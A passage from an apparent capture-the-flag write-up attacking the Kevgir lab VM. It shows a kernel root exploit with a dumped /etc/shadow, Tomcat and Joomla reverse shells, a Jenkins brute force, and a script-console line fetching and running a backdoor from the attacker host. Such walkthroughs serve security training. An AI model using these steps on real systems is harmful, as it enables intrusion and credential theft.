+</span><span class='line'>Linux Kernel <span class="o">(</span>Ubuntu 14.04.3<span class="o">)</span> - perf_event_open<span class="o">()</span> Can Race with execve<span class="o">()</span> <span class="o">(</span>/etc/shadow<span class="o">)</span>                                                     <span class="p">|</span> ./linux/dos/39771.txt&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;hr /&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>After several attempts and found the exploit <code>overlayfs local root exploit (39166.c)</code> is able to work.</p>
+
+<p>So the next step is to upload the exploit file <code>39166.c</code> and <code>gcc</code> compile it to executable file, and run it for rooting!</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>admin@canyoupwnme:/tmp<span class="nv">$ </span>gcc 39166.c -o 39166
+</span><span class='line'>admin@canyoupwnme:/tmp<span class="nv">$ </span>./39166
+</span><span class='line'>root@canyoupwnme:/tmp# id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>admin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>admin<span class="o">)</span>
+</span><span class='line'>root@canyoupwnme:/tmp# <span class="nb">pwd</span>
+</span><span class='line'>/tmp
+</span><span class='line'>root@canyoupwnme:/tmp# cat /etc/shadow
+</span><span class='line'>root:<span class="nv">$6$6ZcgUVCV$Ocsce9FUHYswcbI3UtrPNqFnkvcPOnEtstWlVSTqGYEYAYZ9aYw7tnW35uRGxb1z7ZZBZ</span>.hoQcm/S/cg0f4uI0:16843:0:99999:7:::
+</span><span class='line'>daemon:&lt;em&gt;:16652:0:99999:7:::
+</span><span class='line'>bin:&lt;/em&gt;:16652:0:99999:7:::
+</span><span class='line'>sys:&lt;em&gt;:16652:0:99999:7:::
+</span><span class='line'>sync:&lt;/em&gt;:16652:0:99999:7:::
+</span><span class='line'>games:&lt;em&gt;:16652:0:99999:7:::
+</span><span class='line'>man:&lt;/em&gt;:16652:0:99999:7:::
+</span><span class='line'>lp:&lt;em&gt;:16652:0:99999:7:::
+</span><span class='line'>mail:&lt;/em&gt;:16652:0:99999:7:::
+</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;news:*:16652:0:99999:7:::&quot;</span>&gt;news:*:16652:0:99999:7:::&lt;/a&gt;
+</span><span class='line'>uucp:&lt;em&gt;:16652:0:99999:7:::
+</span><span class='line'>proxy:&lt;/em&gt;:16652:0:99999:7:::
+</span><span class='line'>www-data:&lt;em&gt;:16652:0:99999:7:::
+</span><span class='line'>backup:&lt;/em&gt;:16652:0:99999:7:::
+</span><span class='line'>list:&lt;em&gt;:16652:0:99999:7:::
+</span><span class='line'>irc:&lt;/em&gt;:16652:0:99999:7:::
+</span><span class='line'>gnats:&lt;em&gt;:16652:0:99999:7:::
+</span><span class='line'>nobody:&lt;/em&gt;:16652:0:99999:7:::
+</span><span class='line'>libuuid:!:16652:0:99999:7:::
+</span><span class='line'>syslog:&lt;em&gt;:16652:0:99999:7:::
+</span><span class='line'>mysql:!:16834:0:99999:7:::
+</span><span class='line'>messagebus:&lt;/em&gt;:16834:0:99999:7:::
+</span><span class='line'>landscape:&lt;em&gt;:16834:0:99999:7:::
+</span><span class='line'>sshd:&lt;/em&gt;:16834:0:99999:7:::
+</span><span class='line'>tomcat7:&lt;em&gt;:16834:0:99999:7:::
+</span><span class='line'>user:<span class="nv">$6$a9pCcsxn$5xvkibMZh9RDRVuAeC6vJSR2x17t52pYtdd50</span>/rh3TY.ZoE53GE.OcbtVdBMRKROLko.qbIqj88k5mOXjtE3q.:16834:0:99999:7:::
+</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;ftp:*:16834:0:99999:7:::&quot;</span>&gt;ftp:*:16834:0:99999:7:::&lt;/a&gt;
+</span><span class='line'>admin:<span class="nv">$6$mf3G6MUz$/</span>si.Yp0SgJH/D4WQRC2lyRAaFKUqeHzC3ZbL7ENrCR2lCNibr0d8V0y03JFEnymP8MZzBi3m6mvaeeUmyySve/:16834:0:99999:7:::
+</span><span class='line'>statd:&lt;/em&gt;:16839:0:99999:7:::
+</span><span class='line'>jenkins:*:16840:0:99999:7:::
+</span><span class='line'>root@canyoupwnme:/tmp#
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Well done!</p>
+
+<h3>Vector 2: Tomcat default account login and file upload vulnerability</h3>
+
+<p>From the nikto result of port 8080, I found this is a tomcat server which the default username/password is still available: <font color="red"><code>tomcat/tomcat</code></font>.</p>
+
+<p>Then, accessing to management page <code>http://10.1.1.128:8080/manager/html/</code> and login with default username/password</p>
+
+<p>After login succeed, use <code>msfvenom</code> to create a reverse_shell WAR exploit.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# msfvenom -p java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.1.1.130 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f war &gt; sh4444.war
+</span><span class='line'>Payload size: <span class="m">1088</span> bytes
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>and then upload/deploy exploit WAR file.</p>
+
+<p><img class="left" src="/downloads/Kevgir/1.png"></p>
+
+<p>Then setup <code>nc</code> to listen on local port <code>4444</code>, and access exploit URL <code>http://10.1.1.128:8080/sh4444/</code> to run the exploit.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvnp 4444
+</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> <span class="p">&amp;</span>hellip<span class="p">;</span>
+</span><span class='line'>connect to <span class="o">[</span>10.1.1.130<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.128<span class="o">]</span> 43783
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>106<span class="o">(</span>tomcat7<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>114<span class="o">(</span>tomcat7<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>114<span class="o">(</span>tomcat7<span class="o">)</span>
+</span><span class='line'><span class="nb">pwd</span>
+</span><span class='line'>/var/lib/tomcat7
+</span><span class='line'>ls -al
+</span><span class='line'>total 24
+</span><span class='line'>drwxr-xr-x  <span class="m">6</span> root    root    <span class="m">4096</span> Feb  <span class="m">3</span> 22:12 .
+</span><span class='line'>drwxr-xr-x <span class="m">50</span> root    root    <span class="m">4096</span> Feb <span class="m">15</span> 06:40 ..
+</span><span class='line'>drwxr-xr-x  <span class="m">3</span> tomcat7 tomcat7 <span class="m">4096</span> Feb  <span class="m">3</span> 22:12 common
+</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root    root      <span class="m">12</span> Jun <span class="m">20</span>  <span class="m">2015</span> conf -&gt; /etc/tomcat7
+</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root    root      <span class="m">17</span> Jun <span class="m">20</span>  <span class="m">2015</span> logs -&gt; ../../log/tomcat7
+</span><span class='line'>drwxr-xr-x  <span class="m">3</span> tomcat7 tomcat7 <span class="m">4096</span> Feb  <span class="m">3</span> 22:12 server
+</span><span class='line'>drwxr-xr-x  <span class="m">3</span> tomcat7 tomcat7 <span class="m">4096</span> Feb  <span class="m">3</span> 22:12 shared
+</span><span class='line'>drwxrwxr-x  <span class="m">6</span> tomcat7 tomcat7 <span class="m">4096</span> May <span class="m">24</span> 12:40 webapps
+</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root    root      <span class="m">19</span> Jun <span class="m">20</span>  <span class="m">2015</span> work -&gt; ../../cache/tomcat7
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Now we are in~</p>
+
+<p>or you can use <code>metasploit (msfconsole)</code> to do this job automatically by using the exploit: <font color="red"><code>exploit/multi/http/tomcat_mgr_upload</code></font>.</p>
+
+<h3>Vector 3: Joomla v1.5 admin password bypass attack</h3>
+
+<p>From the nmap scan result, we know <code>Joomla v1.5</code> is running on target machine&rsquo;s port <code>8081</code>.</p>
+
+<p>Run <code>joomscan</code> to check if any known vulnerability exists, found the joomla version is <code>1.5.1</code> and there is a Remote Admin Password Change Vulnerability.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncate<span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h2&gt;Fingerprinting in progress <span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/h2&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Use of uninitialized value in pattern match <span class="o">(</span>m//<span class="o">)</span> at ./joomscan.pl line 1009.
+</span><span class='line'>~Generic version family <span class="p">&amp;</span>hellip<span class="p">;&amp;</span>hellip<span class="p">;</span>. <span class="o">[</span>1.5.x<span class="o">]</span>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;~1.5.x htaccess.txt revealed <span class="o">[</span>1.5.1 - 1.5.3<span class="o">]</span>
+</span><span class='line'>~1.5.x configuration.php-dist revealed <span class="o">[</span>1.5.1 - 1.5.8<span class="o">]</span>
+</span><span class='line'>~1.5.x en-GB.xml revealed <span class="o">[</span>1.5.0 - 1.5.1<span class="o">]</span>
+</span><span class='line'>~1.5.x en-GB.ini revealed 1.5.1
+</span><span class='line'>~1.5.x admin en-GB.com_config.ini revealed <span class="o">[</span>1.5.0<span class="o">(</span>stable<span class="o">)</span> -1.5.1<span class="o">]</span>
+</span><span class='line'>~1.5.x admin en-GB.ini revealed 1.5.1
+</span><span class='line'>~1.5.x adminlists.html revealed <span class="o">[</span>1.5.0<span class="o">(</span>stable<span class="o">)</span> - 1.5.6<span class="o">]</span>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;ul&gt;
+</span><span class='line'>&lt;li&gt;The Exact version found is 1.5.1&lt;/li&gt;
+</span><span class='line'>&lt;/ul&gt;
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;h2&gt;Fingerprinting <span class="k">done</span>.&lt;/h2&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;<span class="p">&amp;</span>hellip<span class="p">;</span>truncate<span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;<span class="p">&amp;</span>hellip<span class="p">;</span>truncate<span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h1&gt;15&lt;/h1&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Info -&gt; CoreComponent: Joomla Remote Admin Password Change Vulnerability
+</span><span class='line'>Versions Affected: 1.5.5 <span class="p">&amp;</span>lt<span class="p">;</span><span class="o">=</span>
+</span><span class='line'>Check: /components/com_user/controller.php
+</span><span class='line'>Exploit: 1. Go to url : target.com/index.php?option<span class="o">=</span>com_user<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">view</span><span class="o">=</span>reset<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">layout</span><span class="o">=</span>confirm  2. Write into field <span class="p">&amp;</span>ldquo<span class="p">;</span>token<span class="p">&amp;</span>rdquo<span class="p">;</span> char <span class="p">&amp;</span>lsquo<span class="p">;</span> and Click OK.  3. Write new password <span class="k">for</span> admin  4. Go to url : target.com/administrator/  5. Login admin with new password
+</span><span class='line'>Vulnerable? Yes&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;<span class="p">&amp;</span>hellip<span class="p">;</span>truncate<span class="p">&amp;</span>hellip<span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Followed the instruction and change the Joomla admin password to <font color="red"><code>test</code></font>, and then login to the administrator page.</p>
+
+<p><img class="left" src="/downloads/Kevgir/2.png"></p>
+
+<p>Then choose <code>Extensions</code> &ndash;> <code>Template Manager</code> &ndash;> <code>beez</code> (any template will do the job) &ndash;> <code>Edit HTML</code></p>
+
+<p>Then clear all the exist content and paste your PHP exploit code here (in this case, I am using <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="PHP Reverse Shell by pentestmonkey">Pentest Monkey</a> one.).</p>
+
+<p>Then save and apply.</p>
+
+<p><img class="left" src="/downloads/Kevgir/3.png"></p>
+
+<p>Finally, setup <code>nc</code> to listen on port <code>4444</code> and preview the page to trigger the exploit:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Kevgir# nc -lvnp 4444
+</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> <span class="p">&amp;</span>hellip<span class="p">;</span>
+</span><span class='line'>connect to <span class="o">[</span>10.1.1.130<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.128<span class="o">]</span> 43800
+</span><span class='line'>Linux canyoupwnme 3.19.0-25-generic <span class="c">#26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux</span>
+</span><span class='line'> 14:02:50 up <span class="m">1</span> day,  1:06,  <span class="m">1</span> user,  load average: 0.16, 0.07, 0.06
+</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span><span class='line'>admin    pts/0    10.1.1.130       Mon15    1:33m  0.20s  0.06s sshd: admin <span class="o">[</span>priv<span class="o">]</span>&lt;br/&gt;
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span><span class='line'>/bin/sh: 0: can<span class="p">&amp;</span>rsquo<span class="p">;</span>t access tty<span class="p">;</span> job control turned off
+</span><span class='line'><span class="nv">$ </span>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
+</span><span class='line'>/
+</span></code></pre></td></tr></table></div></figure></p>
+
+<h3>Vector 4: Jenkins login bruteforce attack</h3>
+
+<p>Due to Jenkins is vulnerable to brute force attacking&hellip;</p>
+
+<p>so use MSF to brute force attack the jenkins server with common dictionary</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf auxiliary<span class="o">(</span>jenkins_login<span class="o">)</span> &gt; show options&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Module options <span class="o">(</span>auxiliary/scanner/http/jenkins_login<span class="o">)</span>:&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;   Name              Current Setting                                   Required  Description&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;hr /&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;   BLANK_PASSWORDS   <span class="nb">false                                             </span>no        Try blank passwords <span class="k">for</span> all users
+</span><span class='line'>   BRUTEFORCE_SPEED  <span class="m">5</span>                                                 yes       How fast to bruteforce, from <span class="m">0</span> to 5
+</span><span class='line'>   DB_ALL_CREDS      <span class="nb">false                                             </span>no        Try each user/password couple stored in the current database
+</span><span class='line'>   DB_ALL_PASS       <span class="nb">false                                             </span>no        Add all passwords in the current database to the list
+</span><span class='line'>   DB_ALL_USERS      <span class="nb">false                                             </span>no        Add all users in the current database to the list
+</span><span class='line'>   HTTP_METHOD       POST                                              yes       The HTTP method to use <span class="k">for</span> the login <span class="o">(</span>Accepted: GET, POST<span class="o">)</span>
+</span><span class='line'>   LOGIN_URL         /j_acegi_security_check                           yes       The URL that handles the login process
+</span><span class='line'>   PASSWORD                                                            no        A specific password to authenticate with
+</span><span class='line'>   PASS_FILE         /root/tools/SecLists/Passwords/john.txt           no        File containing passwords, one per line
+</span><span class='line'>   Proxies                                                             no        A proxy chain of format <span class="nb">type</span>:host:port<span class="o">[</span>,type:host:port<span class="o">][</span><span class="p">&amp;</span>hellip<span class="p">;</span><span class="o">]</span>
+</span><span class='line'>   RHOSTS            10.1.1.128                                        yes       The target address range or CIDR identifier
+</span><span class='line'>   RPORT             <span class="m">9000</span>                                              yes       The target port
+</span><span class='line'>   STOP_ON_SUCCESS   <span class="nb">false                                             </span>yes       Stop guessing when a credential works <span class="k">for</span> a host
+</span><span class='line'>   THREADS           <span class="m">10</span>                                                yes       The number of concurrent threads
+</span><span class='line'>   USERNAME                                                            no        A specific username to authenticate as
+</span><span class='line'>   USERPASS_FILE                                                       no        File containing users and passwords separated by space, one pair per line
+</span><span class='line'>   USER_AS_PASS      <span class="nb">false                                             </span>no        Try the username as the password <span class="k">for</span> all users
+</span><span class='line'>   USER_FILE         /root/tools/SecLists/Usernames/top_shortlist.txt  no        File containing usernames, one per line
+</span><span class='line'>   VERBOSE           <span class="nb">true                                              </span>yes       Whether to print output <span class="k">for</span> all attempts
+</span><span class='line'>   VHOST                                                               no        HTTP server virtual host&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;msf auxiliary<span class="o">(</span>jenkins_login<span class="o">)</span> &gt; <span class="nb">set </span>verbose <span class="nb">false</span>
+</span><span class='line'><span class="nv">verbose</span> <span class="o">=</span>&gt; <span class="nb">false</span>
+</span><span class='line'>msf auxiliary<span class="o">(</span>jenkins_login<span class="o">)</span> &gt; exploit&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> 10.1.1.128:9000 - LOGIN SUCCESSFUL: admin:hello
+</span><span class='line'>^C<span class="o">[</span>&lt;em&gt;<span class="o">]</span> Caught interrupt from the console<span class="p">&amp;</span>hellip<span class="p">;</span>
+</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Auxiliary module execution completed
+</span><span class='line'>msf auxiliary<span class="o">(</span>jenkins_login<span class="o">)</span> &gt;
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Bingo! user login found: <font color="red"><code>admin/hello</code></font>.</p>
+
+<p>Now let&rsquo;s login to jenkins managing page, and following to this <a href="http://dan.thoeisen.dk/hjem/lets-hack-a-jenkins-server/" title="Jenkins attacking tutorial">tutorial</a> to run commands.</p>
+
+<p>Go to <code>Manage Jenkins</code> and then <code>Script Console</code>, input and run the following script code to check if command can be run on the target server.</p>
+
+<p><img class="left" src="/downloads/Kevgir/4.png"></p>
+
+<p>Next, run <code>msfconsole</code> and use payload <code>exploit/multi/script/web_delivery</code> to create python backdoor and setup evil web server on local port <code>8080</code> in order to upload the backdoor.</p>
+
+<p>After evil web server has been established, we input the following code in the script console.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>def <span class="nv">process</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>wget &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.130:8080/z7UgcWwtF&quot;</span>&gt;http://10.1.1.130:8080/z7UgcWwtF&lt;/a&gt; -O /tmp/bdsh4444<span class="p">&amp;</span>rdquo<span class="p">;</span>.execute<span class="o">()</span> &lt;br/&gt;
+</span><span class='line'>def <span class="nv">process3</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>python /tmp/bdsh4444<span class="p">&amp;</span>rdquo<span class="p">;</span>.execute<span class="o">()</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf exploit<span class="o">(</span>web_delivery<span class="o">)</span> &gt; show options&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Module options <span class="o">(</span>exploit/multi/script/web_delivery<span class="o">)</span>:&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;   Name     Current Setting  Required  Description&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;hr /&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;   SRVHOST  0.0.0.0          yes       The <span class="nb">local </span>host to listen on. This must be an address on the <span class="nb">local </span>machine or 0.0.0.0
+</span><span class='line'>   SRVPORT  <span class="m">8080</span>             yes       The <span class="nb">local </span>port to listen on.
+</span><span class='line'>   SSL      <span class="nb">false            </span>no        Negotiate SSL <span class="k">for</span> incoming connections
+</span><span class='line'>   SSLCert                   no        Path to a custom SSL certificate <span class="o">(</span>default is randomly generated<span class="o">)</span>
+</span><span class='line'>   URIPATH                   no        The URI to use <span class="k">for</span> this exploit <span class="o">(</span>default is random<span class="o">)</span>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Payload options <span class="o">(</span>python/meterpreter/reverse_tcp<span class="o">)</span>:&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;   Name   Current Setting  Required  Description&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;hr /&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;   LHOST  10.1.1.130       yes       The listen address
+</span><span class='line'>   LPORT  <span class="m">4444</span>             yes       The listen port&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Exploit target:&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;   Id  Name&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;hr /&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;   <span class="m">0</span>   Python&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;msf exploit<span class="o">(</span>web_delivery<span class="o">)</span> &gt; exploit
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Exploit running as background job.&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;<span class="o">[</span>&lt;em&gt;<span class="o">]</span> Started reverse TCP handler on 10.1.1.130:4444
+</span><span class='line'>msf exploit<span class="o">(</span>web_delivery<span class="o">)</span> &gt; <span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Using URL: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://0.0.0.0:8080/z7UgcWwtF&quot;</span>&gt;http://0.0.0.0:8080/z7UgcWwtF&lt;/a&gt;
+</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Local IP: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.130:8080/z7UgcWwtF&quot;</span>&gt;http://10.1.1.130:8080/z7UgcWwtF&lt;/a&gt;
+</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Server started.
+</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Run the following <span class="nb">command </span>on the target machine:
